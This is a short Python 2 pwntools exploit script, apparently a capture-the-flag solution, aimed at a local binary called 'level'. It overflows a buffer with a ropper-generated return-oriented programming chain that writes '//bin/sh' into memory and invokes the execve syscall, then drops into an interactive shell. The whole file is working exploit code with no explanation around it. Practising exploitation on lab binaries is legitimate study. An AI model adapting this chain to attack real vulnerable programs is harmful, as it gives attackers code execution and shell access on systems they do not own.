#!/usr/bin/env python2

from pwn import *

target = process("./level")

# Generated by ropper ropchain generator #
# command: ropper --file level --chain "execve cmd=/bin/sh"
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # level
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000016310) # 0x0000000000416310: pop rdx; ret; 
rop += '//bin/sh'
rop += rebase_0(0x000000000001297e) # 0x000000000041297e: pop rax; ret; 
rop += p(0x00000000000000a0 + 0x00617000) ###modified
rop += rebase_0(0x000000000000625b) # 0x000000000040625b: mov qword ptr [rax], rdx; nop; pop rbp; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000016310) # 0x0000000000416310: pop rdx; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000001297e) # 0x000000000041297e: pop rax; ret; 
rop += p(0x00000000000000a8 + 0x00617000) ###modified
rop += rebase_0(0x000000000000625b) # 0x000000000040625b: mov qword ptr [rax], rdx; nop; pop rbp; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000012a73) # 0x0000000000412a73: pop rdi; ret; 
rop += p(0x00000000000000a0 + 0x00617000)
rop += rebase_0(0x0000000000012a71) # 0x0000000000412a71: pop rsi; pop r15; ret; 
rop += p(0x00000000000000a8 + 0x00617000)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000016310) # 0x0000000000416310: pop rdx; ret; 
rop += p(0x00000000000000a8 + 0x00617000)
rop += rebase_0(0x000000000001297e) # 0x000000000041297e: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000012980) # 0x0000000000412980: syscall; ret; 

buffor = "A"*(1+8)+rop

#target.interactive()
#target.clean()
target.sendline(str(len(buffor)))
target.send(buffor)
target.interactive()
